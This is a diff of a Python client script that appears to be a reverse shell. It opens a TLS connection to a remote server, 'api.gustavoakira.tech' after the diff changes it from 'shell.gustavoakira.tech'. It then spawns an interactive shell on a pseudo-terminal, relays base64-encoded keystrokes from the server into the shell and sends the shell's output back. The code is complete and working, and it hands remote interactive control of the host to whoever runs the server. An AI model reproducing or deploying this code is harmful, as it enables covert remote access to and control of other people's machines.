@@ -3,13 +3,20 @@ import subprocess
 import json
 import time
 import ssl
+import os
+import pty
+import select
+import fcntl
+import termios
+import base64
+import struct
 
 # --- CONFIGURATION ---
 # Set to True to use FQDN/public CA mode (Let's Encrypt, etc.)
 USE_FQDN = True
 
 # If using FQDN mode, set the FQDN here (e.g., 'shell.gustavoakira.tech')
-SERVER_FQDN = 'shell.gustavoakira.tech'
+SERVER_FQDN = 'api.gustavoakira.tech'
 # If using self-signed mode, set the IP and cert file
 SERVER_IP = '192.168.0.132'
 CA_CERTFILE = 'server.crt'
@@ -58,28 +65,54 @@ def start_client():
             except Exception as e:
                 print(f"[-] Error sending hostname info: {e}")
 
-            while True:
-                try:
-                    message_length = int(secure_client_socket.recv(64).decode('utf-8').strip())
-                    command_message = secure_client_socket.recv(message_length).decode('utf-8')
-                    data = json.loads(command_message)
+            # Fork a child process to create a pseudo-terminal
+            pid, master_fd = pty.fork()
+            if pid == 0:
+                # Child process: spawn a shell
+                shell = os.environ.get('SHELL', 'sh')
+                os.execv(shell, [shell])
+            else:
+                # Parent process: handle communication
+                while True:
+                    try:
+                        # Use select to wait for data from the socket or the PTY
+                        r, w, e = select.select([secure_client_socket, master_fd], [], [])
 
-                    if data['type'] == 'command':
-                        command = data['command']
-                        print(f"[*] Executing command: {command}")
-                        process = subprocess.run(command, shell=True, capture_output=True, text=True)
-                        output = process.stdout + process.stderr
-                        send_message(secure_client_socket, {'type': 'output', 'output': output})
+                        if secure_client_socket in r:
+                            # Data from server -> write to PTY
+                            message_length_raw = secure_client_socket.recv(64)
+                            if not message_length_raw:
+                                break
+                            message_length = int(message_length_raw.decode('utf-8').strip())
+                            message_raw = secure_client_socket.recv(message_length)
+                            if not message_raw:
+                                break
+                            
+                            data = json.loads(message_raw.decode('utf-8'))
 
-                except json.JSONDecodeError:
-                    print("[-] Invalid JSON received.")
-                    break
-                except ssl.SSLError as e:
-                    print(f"[-] SSL Error during communication: {e}")
-                    break
-                except Exception as e:
-                    print(f"[-] Error during communication: {e}")
-                    break
+                            if data['type'] == 'pty_input':
+                                pty_input = base64.b64decode(data['data'])
+                                os.write(master_fd, pty_input)
+                            elif data['type'] == 'resize':
+                                # Resize the PTY
+                                rows, cols = data['rows'], data['cols']
+                                fcntl.ioctl(master_fd, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))
+
+                        if master_fd in r:
+                            # Data from PTY -> send to server
+                            pty_output = os.read(master_fd, 1024)
+                            if pty_output:
+                                encoded_output = base64.b64encode(pty_output).decode('utf-8')
+                                send_message(secure_client_socket, {'type': 'pty_output', 'data': encoded_output})
+                            else:
+                                # PTY closed (shell exited)
+                                break
+
+                    except (BrokenPipeError, OSError):
+                        break
+                    except Exception as e:
+                        print(f"[-] Error during PTY communication: {e}")
+                        break
 
         except ConnectionRefusedError:
             print(f"[-] Connection refused. Retrying in 5 seconds...")
